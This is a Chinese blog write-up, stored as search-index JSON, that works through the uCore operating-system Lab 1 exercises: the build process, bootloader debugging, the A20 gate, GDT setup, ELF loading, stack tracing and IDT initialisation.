1:","date":"2021-07-10","objectID":"/ucore-lab-1/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#lab-1"},{"categories":["Pwning"],"content":"练习1理解通过make生成执行文件的过程 这个练习需要对Makefile有一定的了解。 首先，我们使用make V=看一下make执行了什么命令 + cc kern/init/init.c gcc -Ikern/init/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/init/init.c -o obj/kern/init/init.o + cc kern/libs/stdio.c gcc -Ikern/libs/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/libs/stdio.c -o obj/kern/libs/stdio.o + cc kern/libs/readline.c gcc -Ikern/libs/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/libs/readline.c -o obj/kern/libs/readline.o + cc kern/debug/panic.c gcc -Ikern/debug/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/debug/panic.c -o obj/kern/debug/panic.o + cc kern/debug/kdebug.c gcc -Ikern/debug/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/debug/kdebug.c -o obj/kern/debug/kdebug.o + cc kern/debug/kmonitor.c gcc -Ikern/debug/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/debug/kmonitor.c -o obj/kern/debug/kmonitor.o + cc kern/driver/clock.c gcc -Ikern/driver/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/driver/clock.c -o obj/kern/driver/clock.o + cc kern/driver/console.c gcc -Ikern/driver/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/driver/console.c -o obj/kern/driver/console.o + cc kern/driver/picirq.c gcc -Ikern/driver/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/driver/picirq.c -o obj/kern/driver/picirq.o + cc kern/driver/intr.c gcc -Ikern/driver/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/driver/intr.c -o obj/kern/driver/intr.o + cc kern/trap/trap.c gcc -Ikern/trap/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/trap/trap.c -o obj/kern/trap/trap.o + cc kern/trap/vectors.S gcc -Ikern/trap/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/trap/vectors.S -o obj/kern/trap/vectors.o + cc kern/trap/trapentry.S gcc -Ikern/trap/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/trap/trapentry.S -o obj/kern/trap/trapentry.o + cc kern/mm/pmm.c gcc -Ikern/mm/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/trap/ -Ikern/mm/ -c kern/mm/pmm.c -o obj/kern/mm/pmm.o + cc libs/string.c gcc -Ilibs/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -c libs/string.c -o obj/libs/string.o + cc libs/printfmt.c gcc -Ilibs/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -c libs/printfmt.c -o obj/libs/printfmt.o + ld bin/kernel ld -m elf_i386 -nostdlib -T tools/kernel.ld -o bin/kernel obj/kern/init/init.o obj/kern/libs/stdio.o obj/kern/libs/readline.o obj/kern/debug/panic.o obj/kern/debug/kdebug.o obj/kern/debug/kmonitor.o obj/kern/driver/clock.o obj/kern/driver/console.o obj/kern/driver/picirq.o obj/kern/driver/intr.o obj/kern/trap/trap.o obj/kern/trap/vectors.o obj/kern/trap/trapentry.o obj/kern","date":"2021-07-10","objectID":"/ucore-lab-1/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#练习1"},{"categories":["Pwning"],"content":"dd命令dd 命令用于读取、转换并输出数据。dd 可从标准输入或文件中读取数据，根据指定的格式来转换数据，再输出到文件、设备或标准输出。 仅针对出现的参数进行解释： if=文件名：输入文件名，默认为标准输入。即指定源文件。 of=文件名：输出文件名，默认为标准输出。即指定目的文件。 seek=blocks：从输出文件开头跳过blocks个块后再开始复制。 count=blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数。 这样可以看出，我们最后生成的文件就是bin/ucore.img这个镜像文件，而最后的三个dd命令 dd if=/dev/zero of=bin/ucore.img count=10000 // 将文件bin/ucore.img进行清空 dd if=bin/bootblock of=bin/ucore.img conv=notrunc // 向img的开始写入512字节的bootloader dd if=bin/kernel of=bin/ucore.img seek=1 conv=notrunc // 跳过第一个块512字节，写入内核 接着，我们就从Makefile中看看，为了得到bin/ucore.img，我们要提前准备那些文件 Makefile就是这样的，在其中指定了代码编译的规则，更重要的是指定了程序之间的依赖关系，所以从头看是不行的，要从最后的结果来推导整个文件的结构。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#dd命令"},{"categories":["Pwning"],"content":"ucore.img # create ucore.img UCOREIMG := $(call totarget,ucore.img) $(UCOREIMG): $(kernel) $(bootblock) $(V)dd if=/dev/zero of=$@ count=10000 $(V)dd if=$(bootblock) of=$@ conv=notrunc $(V)dd if=$(kernel) of=$@ seek=1 conv=notrunc $(call create_target,ucore.img) 为了得到ucore.img，需要kernel和bootblock。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:2","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ucoreimg"},{"categories":["Pwning"],"content":"bootblock # create bootblock bootfiles = $(call listf_cc,boot) $(foreach f,$(bootfiles),$(call cc_compile,$(f),$(CC),$(CFLAGS) -Os -nostdinc)) # 这里遍历 boot 目录下的所有文件 asm.h bootasm.S bootmain.c bootblock = $(call totarget,bootblock) # 生成目标文件 asm.o bootasm.o bootmain.o sign.o $(bootblock): $(call toobj,$(bootfiles)) | $(call totarget,sign) @echo + ld $@ $(V)$(LD) $(LDFLAGS) -N -e start -Ttext 0x7C00 $^ -o $(call toobj,bootblock) @$(OBJDUMP) -S $(call objfile,bootblock) \u003e $(call asmfile,bootblock) @$(OBJDUMP) -t $(call objfile,bootblock) | $(SED) '1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d' \u003e $(call symfile,bootblock) @$(OBJCOPY) -S -O binary $(call objfile,bootblock) $(call outfile,bootblock) @$(call totarget,sign) $(call outfile,bootblock) $(bootblock) # 将目标文件 链接起来 同时指定代码段开始地址 为 0x7c00 $(call create_target,bootblock) 生成bootblock，需要bootasm.o、bootmain.o、sign 生成bootasm.o需要bootasm.S，实际执行命令为 gcc -Iboot/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Os -nostdinc -c boot/bootasm.S -o obj/boot/bootasm.o 其中关键的参数为 -ggdb 生成可供gdb使用的调试信息。这样才能用qemu+gdb来调试bootloader or ucore。 -m32 生成适用于32位环境的代码。我们用的模拟硬件是32bit的80386，所以ucore也要是32位的软件。 -gstabs 生成stabs格式的调试信息。这样要ucore的monitor可以显示出便于开发者阅读的函数调用栈信息 -nostdinc 不使用标准库。标准库是给应用程序用的，我们是编译ucore内核，OS内核是提供服务的，所以所有的服务要自给自足。 -fno-stack-protector 不生成用于检测缓冲区溢出的代码。这是for 应用程序的，我们是编译内核，ucore内核好像还用不到此功能。 -Os 为减小代码大小而进行优化。根据硬件spec，主引导扇区只有512字节，我们写的简单bootloader的最终大小不能大于510字节。 -I\u003cdir\u003e 添加搜索头文件的路径 生成bootmain.o需要bootmain.c 实际执行命令为 gcc -Iboot/ -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Os -nostdinc -c boot/bootmain.c -o obj/boot/bootmain.o -fno-builtin 除非用__builtin_前缀，否则不进行builtin函数的优化 ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:3","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#bootblock"},{"categories":["Pwning"],"content":"sign # create 'sign' tools $(call add_files_host,tools/sign.c,sign,sign) $(call create_target_host,sign,sign) 实际执行命令为 gcc -Itools/ -g -Wall -O2 -c tools/sign.c -o obj/sign/tools/sign.o gcc -g -Wall -O2 obj/sign/tools/sign.o -o bin/sign 首先生成bootblock.o ld -m elf_i386 -nostdlib -N -e start -Ttext 0x7C00 obj/boot/bootasm.o obj/boot/bootmain.o -o obj/bootblock.o 其中关键的参数为 -m \u003cemulation\u003e 模拟为i386上的连接器 -nostdlib 不使用标准库 -N 设置代码段和数据段均可读写 -e \u003centry\u003e 指定入口 -Ttext 制定代码段开始位置 拷贝二进制代码bootblock.o到bootblock.out objcopy -S -O binary obj/bootblock.o obj/bootblock.out 其中关键的参数为 -S 移除所有符号和重定位信息 -O \u003cbfdname\u003e 指定输出格式 使用sign工具处理bootblock.out，生成bootblock bin/sign obj/bootblock.out bin/bootblock ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:4","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#sign"},{"categories":["Pwning"],"content":"kernel # create kernel target kernel = $(call totarget,kernel) $(kernel): tools/kernel.ld $(kernel): $(KOBJS) @echo + ld $@ $(V)$(LD) $(LDFLAGS) -T tools/kernel.ld -o $@ $(KOBJS) @$(OBJDUMP) -S $@ \u003e $(call asmfile,kernel) @$(OBJDUMP) -t $@ | $(SED) '1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d' \u003e $(call symfile,kernel) $(call create_target,kernel) kernel.ld是已存在的链接器，这一步将kern目录下生成的所有.o文件，通过kernel.ld链接为kernel。 -T\u003c链接器路径\u003e，使用指定的链接器 其前置命令就是将kern下面的所有文件编译，生成目标文件 # kernel KINCLUDE += kern/debug/ \\ kern/driver/ \\ kern/trap/ \\ kern/mm/ KSRCDIR += kern/init \\ kern/libs \\ kern/debug \\ kern/driver \\ kern/trap \\ kern/mm KCFLAGS += $(addprefix -I,$(KINCLUDE)) $(call add_files_cc,$(call listf_cc,$(KSRCDIR)),kernel,$(KCFLAGS)) KOBJS = $(call read_packet,kernel libs) 一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？ code: sign.c ... buf[510] = 0x55; buf[511] = 0xAA; ... ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:5","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#kernel"},{"categories":["Pwning"],"content":"练习2使用qemu执行并调试lab1中的软件 在开始debug之前，我们参考其实验报告中的提示将/tools/gdbinit的内容修改如下： file bin/kernel set architecture i8086 target remote :1234 b* 0x7c00 define hook-stop x/i $eip end continue 之后使用make debug就可以进行调试。 这里pwndbg插件无法进行调试，只能使用peda了 也可以直接对答案进行调试，使用make lab1-mon。 下面我们将反汇编得到的代码与bootasm.S和 bootblock.asm进行比较： gdb-peda$ x/10i 0x7c02: xor eax,eax 0x7c04: mov ds,eax 0x7c06: mov es,eax 0x7c08: mov ss,eax 0x7c0a: in al,0x64 0x7c0c: test al,0x2 0x7c0e: jne 0x7c0a 0x7c10: mov al,0xd1 0x7c12: out 0x64,al 0x7c14: in al,0x64 而在bootblock.asm中 00007c00 \u003cstart\u003e: # start address should be 0:7c00, in real mode, the beginning address of the running bootloader .globl start start: .code16 # Assemble for 16-bit mode cli # Disable interrupts 7c00: fa cli cld # String operations increment 7c01: fc cld # Set up the important data segment registers (DS, ES, SS). xorw %ax, %ax # Segment number zero 7c02: 31 c0 xor %eax,%eax movw %ax, %ds # -\u003e Data Segment 7c04: 8e d8 mov %eax,%ds movw %ax, %es # -\u003e Extra Segment 7c06: 8e c0 mov %eax,%es movw %ax, %ss # -\u003e Stack Segment 7c08: 8e d0 mov %eax,%ss 当你删除gdbinit中的continue后，就可以调试从BIOS开始的指令。非常有趣的一点是，记得吗，执行BIOS时，cpu还在实模式，而gdb默认只输出$ip 所指向地址的指针，而不是cs:ip。正确的指令应该是这样： gdb-peda$ x/5i (($cs\u003c\u003c4)+$eip) 0xffff0: jmp 0x3630:0xf000e05b 0xffff7: das 0xffff8: xor dh,BYTE PTR [ebx] 0xffffa: das 0xffffb: cmp DWORD PTR [ecx],edi gdb-peda$ x/5i (($cs\u003c\u003c4)+$eip) 0xfe05b: cmp WORD PTR cs:[esi],0xffc8 0xfe060: bound eax,QWORD PTR [eax] 0xfe062: jne 0xd241d0b2 0xfe068: mov ss,edx 0xfe06a: mov sp,0x7000 （感谢@2st\u0026@kiprey） ","date":"2021-07-10","objectID":"/ucore-lab-1/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#练习2"},{"categories":["Pwning"],"content":"练习3分析bootloader进入保护模式的过程 start: .code16 # Assemble for 16-bit mode cli # Disable interrupts cld # String operations increment # Set up the important data segment registers (DS, ES, SS). xorw %ax, %ax # Segment number zero movw %ax, %ds # -\u003e Data Segment movw %ax, %es # -\u003e Extra Segment movw %ax, %ss # -\u003e Stack Segment 首先，cli禁用中断，它的全称为Clear Interupt。cld(Clear Direction)设置了字节的传输从低位开始。清空重要的段寄存器。 cld指令使变址寄存器SI或DI的地址指针自动增加，从前向后处理。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#练习3"},{"categories":["Pwning"],"content":"有关A20？ 为什么要开启A20？ Intel早期的8086 CPU提供了20根地址线，但寄存器只有16位，所以使用段寄存器值 « 4 + 段内偏移值的方法来访问到所有内存，但按这种方式来计算出的地址的最大值为1088KB，超过20根地址线所能表示的范围，会发生“回卷”(memory wraparound)（和整数溢出有点类似）。但下一代的基于Intel 80286 CPU的计算机系统提供了24根地址线，当CPU计算出的地址超过1MB时便不会发生回卷，而这就造成了向下不兼容。为了保持完全的向下兼容性，IBM在计算机系统上加个硬件逻辑来模仿早期的回绕特征，而这就是A20 Gate。 如何开启A20？ A20 Gate的方法是把A20地址线控制和键盘控制器的一个输出进行AND操作，这样来控制A20地址线的打开（使能）和关闭（屏蔽\\禁止）。一开始时A20地址线控制是被屏蔽的（总为0），直到系统软件通过一定的IO操作去打开它。当A20 地址线控制禁止时，则程序就像在8086中运行，1MB以上的地址不可访问；保护模式下A20地址线控制必须打开。A20控制打开后，内存寻址将不会发生回卷。 通常的方法是通过设置键盘控制器的端口值，不过有些系统觉得键盘控制器很慢，为此引入了一个Fast Gate A20，它用IO端口的0x92来处理A20信号线。还有一种方法是通过读取0xee端口来开启A20地址线，写端口则会禁止地址线。 从理论上讲，打开A20 Gate的方法是通过设置8042芯片输出端口（64h）的2nd-bit，但事实上，当你向8042芯片输出端口进行写操作的时候，在键盘缓冲区中或许还有别的数据尚未处理，因此你必须首先处理这些数据。 所以，激活A20地址线的流程为： 1.禁止中断；2.等待，直到8042 Input buffer为空为止； 3.发送Write 8042 Output Port命令到8042 Input buffer；4.等待，直到8042 Input buffer为空为止；5.向P2写入数据，将OR2置1 （关于激活我没有找到很详细的资料，只有A20激活详解） 启动A20的汇编代码如下 # Enable A20: # For backwards compatibility with the earliest PCs, physical # address line 20 is tied low, so that addresses higher than # 1MB wrap around to zero by default. This code undoes this. seta20.1: # 等待8042键盘控制器不忙 inb $0x64, %al # 从0x64键盘缓冲区接收消息 testb $0x2, %al # 如果接受到2则表明键盘缓冲区为空 jnz seta20.1 # movb $0xd1, %al # 发送写8042输出端口的指令 outb %al, $0x64 # 0xd1表示写输出端口P2 seta20.1: # 等待8042键盘控制器不忙 inb $0x64, %al # testb $0x2, %al # jnz seta20.1 # movb $0xdf, %al # 0xdf --\u003e P2 outb %al, $0x60 # 1101 1111 ，P2的P21置为1 ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#有关a20"},{"categories":["Pwning"],"content":"如何初始化GDT表？ # Bootstrap GDT .p2align 2 # force 4 byte alignment gdt: SEG_NULLASM # null seg SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff) # code seg for bootloader and kernel SEG_ASM(STA_W, 0x0, 0xffffffff) # data seg for bootloader and kernel gdtdesc: .word 0x17 # sizeof(gdt) - 1 .long gdt # address gdt 设置表中第一项为NULL 表中第二项为代码段描述符，可读可执行 表中第二项为数据段描述符，可写 回到bootloader的代码 # Switch from real to protected mode, using a bootstrap GDT # and segment translation that makes virtual addresses # identical to physical addresses, so that the # effective memory map does not change during the switch. lgdt gdtdesc movl %cr0, %eax orl $CR0_PE_ON, %eax movl %eax, %cr0 在开启A20之后，加载了GDT全局描述符表，它是被静态储存在引导区中的，载入即可。 接着，将cr0寄存器的bit 0置为1，标志着从实模式转换到保护模式。 # Jump to next instruction, but in 32-bit code segment. # Switches processor into 32-bit mode. ljmp $PROT_MODE_CSEG, $protcseg 因为长跳转可以设置其cs寄存器，所以使用一个长跳转进入32位指令模式执行。 .code32 # Assemble for 32-bit mode protcseg: # Set up the protected-mode data segment registers movw $PROT_MODE_DSEG, %ax # Our data segment selector movw %ax, %ds # -\u003e DS: Data Segment movw %ax, %es # -\u003e ES: Extra Segment movw %ax, %fs # -\u003e FS movw %ax, %gs # -\u003e GS movw %ax, %ss # -\u003e SS: Stack Segment # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00) movl $0x0, %ebp movl $start, %esp call bootmain # If bootmain returns (it shouldn't), loop. spin: jmp spin 设置各段寄存器，并建立堆栈（0~0x7c00），最后进入bootmain函数（in bootmain.c）中。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:2","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#如何初始化gdt表"},{"categories":["Pwning"],"content":"练习4分析bootloader加载ELF格式的OS的过程 unsigned int SECTSIZE = 512 ; struct elfhdr * ELFHDR = ((struct elfhdr *)0x10000) ; // scratch space /* bootmain - the entry of bootloader */ void bootmain(void) { // read the 1st page off disk readseg((uintptr_t)ELFHDR, SECTSIZE * 8, 0); // is this a valid ELF? if (ELFHDR-\u003ee_magic != ELF_MAGIC) { goto bad; } struct proghdr *ph, *eph; // load each program segment (ignores ph flags) ph = (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-\u003ee_phoff); eph = ph + ELFHDR-\u003ee_phnum; for (; ph \u003c eph; ph ++) { readseg(ph-\u003ep_va \u0026 0xFFFFFF, ph-\u003ep_memsz, ph-\u003ep_offset); } // call the entry point from the ELF header // note: does not return ((void (*)(void))(ELFHDR-\u003ee_entry \u0026 0xFFFFFF))(); bad: outw(0x8A00, 0x8A00); outw(0x8A00, 0x8E00); /* do nothing */ while (1); } 首先，从硬盘读取一页（512*8）的内容加载到0x10000。 现在考虑它是如何读取的？ bootloader让CPU进入保护模式后，下一步的工作就是从硬盘上加载并运行OS。考虑到实现的简单性，bootloader的访问硬盘都是LBA模式的PIO（Program IO）方式，即所有的IO操作是通过CPU访问硬盘的IO地址寄存器完成。 一般主板有2个IDE通道，每个通道可以接2个IDE硬盘。访问第一个硬盘的扇区可设置IO地址寄存器0x1f0-0x1f7实现的，具体参数见下表。一般第一个IDE通道通过访问IO地址0x1f0-0x1f7来实现，第二个IDE通道通过访问0x170-0x17f实现。每个通道的主从盘的选择通过第6个IO偏移地址寄存器来设置。 第6位：为1=LBA模式；0 = CHS模式 第7位和第5位必须为1 IO地址 功能 0x1f0 读数据，当0x1f7不为忙状态时，可以读。 0x1f2 要读写的扇区数，每次读写前，你需要表明你要读写几个扇区。最小是1个扇区 0x1f3 如果是LBA模式，就是LBA参数的0-7位 0x1f4 如果是LBA模式，就是LBA参数的8-15位 0x1f5 如果是LBA模式，就是LBA参数的16-23位 0x1f6 第0~3位：如果是LBA模式就是24-27位 第4位：为0主盘；为1从盘 0x1f7 状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据 当前 硬盘数据是储存到硬盘扇区中，一个扇区大小为512字节。读一个扇区的流程大致如下： 等待磁盘准备好 发出读取扇区的命令 等待磁盘准备好 把磁盘扇区数据读到指定内存 在c代码中是这样实现的，readseg()是readsect()的一个封装： /* readsect - read a single sector at @secno into @dst */ static void readsect(void *dst, uint32_t secno) { // wait for disk to be ready waitdisk(); outb(0x1F2, 1); // count = 1 outb(0x1F3, secno \u0026 0xFF); outb(0x1F4, (secno \u003e\u003e 8) \u0026 0xFF); outb(0x1F5, (secno \u003e\u003e 16) \u0026 0xFF); outb(0x1F6, ((secno \u003e\u003e 24) \u0026 0xF) | 0xE0); outb(0x1F7, 0x20); // cmd 0x20 - read sectors // wait for disk to be ready waitdisk(); // read a sector insl(0x1F0, dst, SECTSIZE / 4); } /* waitdisk - wait for disk ready */ static void waitdisk(void) { while ((inb(0x1F7) \u0026 0xC0) != 0x40) /* do nothing */; } static inline void outb(uint16_t port, uint8_t data) { asm volatile (\"outb %0, %1\" :: \"a\" (data), \"d\" (port) : \"memory\"); } 加载到磁盘后，判断其是否是一个合法的ELF： // is this a valid ELF? if (ELFHDR-\u003ee_magic != ELF_MAGIC) { goto bad; } 如果合法则： // load each program segment (ignores ph flags) // 在ELF文件头中，有描述符表记录了ELF文件应该加载到什么位置 // 将描述符表保存到ph中 ph = (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-\u003ee_phoff); eph = ph + ELFHDR-\u003ee_phnum; // 按照描述表将ELF文件中数据载入内存 for (; ph \u003c eph; ph ++) { readseg(ph-\u003ep_va \u0026 0xFFFFFF, ph-\u003ep_memsz, ph-\u003ep_offset); } // call the entry point from the ELF header // note: does not return // 内核入口 ((void (*)(void))(ELFHDR-\u003ee_entry \u0026 0xFFFFFF))(); ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#练习4"},{"categories":["Pwning"],"content":"练习4分析bootloader加载ELF格式的OS的过程 unsigned int SECTSIZE = 512 ; struct elfhdr * ELFHDR = ((struct elfhdr *)0x10000) ; // scratch space /* bootmain - the entry of bootloader */ void bootmain(void) { // read the 1st page off disk readseg((uintptr_t)ELFHDR, SECTSIZE * 8, 0); // is this a valid ELF? if (ELFHDR-e_magic != ELF_MAGIC) { goto bad; } struct proghdr *ph, *eph; // load each program segment (ignores ph flags) ph = (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-e_phoff); eph = ph + ELFHDR-e_phnum; for (; ph p_va \u0026 0xFFFFFF, ph-p_memsz, ph-p_offset); } // call the entry point from the ELF header // note: does not return ((void (*)(void))(ELFHDR-e_entry \u0026 0xFFFFFF))(); bad: outw(0x8A00, 0x8A00); outw(0x8A00, 0x8E00); /* do nothing */ while (1); } 首先，从硬盘读取一页（512*8）的内容加载到0x10000。 现在考虑它是如何读取的？ bootloader让CPU进入保护模式后，下一步的工作就是从硬盘上加载并运行OS。考虑到实现的简单性，bootloader的访问硬盘都是LBA模式的PIO（Program IO）方式，即所有的IO操作是通过CPU访问硬盘的IO地址寄存器完成。 一般主板有2个IDE通道，每个通道可以接2个IDE硬盘。访问第一个硬盘的扇区可设置IO地址寄存器0x1f0-0x1f7实现的，具体参数见下表。一般第一个IDE通道通过访问IO地址0x1f0-0x1f7来实现，第二个IDE通道通过访问0x170-0x17f实现。每个通道的主从盘的选择通过第6个IO偏移地址寄存器来设置。 第6位：为1=LBA模式；0 = CHS模式 第7位和第5位必须为1 IO地址 功能 0x1f0 读数据，当0x1f7不为忙状态时，可以读。 0x1f2 要读写的扇区数，每次读写前，你需要表明你要读写几个扇区。最小是1个扇区 0x1f3 如果是LBA模式，就是LBA参数的0-7位 0x1f4 如果是LBA模式，就是LBA参数的8-15位 0x1f5 如果是LBA模式，就是LBA参数的16-23位 0x1f6 第0~3位：如果是LBA模式就是24-27位 第4位：为0主盘；为1从盘 0x1f7 状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据 当前 硬盘数据是储存到硬盘扇区中，一个扇区大小为512字节。读一个扇区的流程大致如下： 等待磁盘准备好 发出读取扇区的命令 等待磁盘准备好 把磁盘扇区数据读到指定内存 在c代码中是这样实现的，readseg()是readsect()的一个封装： /* readsect - read a single sector at @secno into @dst */ static void readsect(void *dst, uint32_t secno) { // wait for disk to be ready waitdisk(); outb(0x1F2, 1); // count = 1 outb(0x1F3, secno \u0026 0xFF); outb(0x1F4, (secno 8) \u0026 0xFF); outb(0x1F5, (secno 16) \u0026 0xFF); outb(0x1F6, ((secno 24) \u0026 0xF) | 0xE0); outb(0x1F7, 0x20); // cmd 0x20 - read sectors // wait for disk to be ready waitdisk(); // read a sector insl(0x1F0, dst, SECTSIZE / 4); } /* waitdisk - wait for disk ready */ static void waitdisk(void) { while ((inb(0x1F7) \u0026 0xC0) != 0x40) /* do nothing */; } static inline void outb(uint16_t port, uint8_t data) { asm volatile (\"outb %0, %1\" :: \"a\" (data), \"d\" (port) : \"memory\"); } 加载到磁盘后，判断其是否是一个合法的ELF： // is this a valid ELF? if (ELFHDR-e_magic != ELF_MAGIC) { goto bad; } 如果合法则： // load each program segment (ignores ph flags) // 在ELF文件头中，有描述符表记录了ELF文件应该加载到什么位置 // 将描述符表保存到ph中 ph = (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-e_phoff); eph = ph + ELFHDR-e_phnum; // 按照描述表将ELF文件中数据载入内存 for (; ph p_va \u0026 0xFFFFFF, ph-p_memsz, ph-p_offset); } // call the entry point from the ELF header // note: does not return // 内核入口 ((void (*)(void))(ELFHDR-e_entry \u0026 0xFFFFFF))(); ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#分析bootloader加载elf格式的os的过程"},{"categories":["Pwning"],"content":"练习5实现函数调用堆栈跟踪函数 void print_stackframe(void) { uint32_t ebp = read_ebp(); uint32_t eip = read_eip(); for(uint32_t i = 0; ebp != 0 \u0026\u0026 i \u003c STACKFRAME_DEPTH; i++) { cprintf(\"ebp: 0x%08x eip: 0x%08x, arg:\", ebp, eip); uint32_t *arg = (uint32_t *)ebp + 2; for(uint32_t j = 0; j\u003c 4; j++) { cprintf(\"0x%08x \", arg[j]); } cprintf(\"\\n\"); print_debuginfo(eip - 1); eip = *((uint32_t *)ebp + 1); ebp = *(uint32_t *)ebp; } } 这里需要对32位c的函数调用有充分的理解 涉及到很多指针操作，还有一点要注意的是，eip指向的是即将执行的指令，所以如果想要查看当前函数需要-1。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:5:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#练习5"},{"categories":["Pwning"],"content":"练习6完善中断初始化和处理 中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？ code in /kern/mm/mmu.h： /* Gate descriptors for interrupts and traps */ struct gatedesc { unsigned gd_off_15_0 : 16; // low 16 bits of offset in segment unsigned gd_ss : 16; // segment selector unsigned gd_args : 5; // # args, 0 for interrupt/trap gates unsigned gd_rsv1 : 3; // reserved(should be zero I guess) unsigned gd_type : 4; // type(STS_{TG,IG32,TG32}) unsigned gd_s : 1; // must be 0 (system) unsigned gd_dpl : 2; // descriptor(meaning new) privilege level unsigned gd_p : 1; // Present unsigned gd_off_31_16 : 16; // high bits of offset in segment }; 一个表项共有8*8 = 64 bit即8字节。其中gd_ss是段选择子，gd_off_15_0是偏移，通过这两项我们就可以找到中断处理代码的入口。 void idt_init(void) { extern uintptr_t __vectors[]; uint32_t i; for(i = 0; i \u003c sizeof(idt) / sizeof(struct gatedesc); i ++) { // 使用宏设置IDT的每一项 // IDT的每一项都是中断且在内核态处理的所以设为`GD_LTEXT`，特权级为`DPL_KERNEL` SETGATE(idt[i], 0, GD_KTEXT, __vectors[i], DPL_KERNEL); } // 系统调用是提供给用户，供其调用的，所以我们要修改其特权级，使其可以在用户态调用 SETGATE(idt[T_SWITCH_TOK], 0, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER); // 加载idt lidt(\u0026idt_pd); } 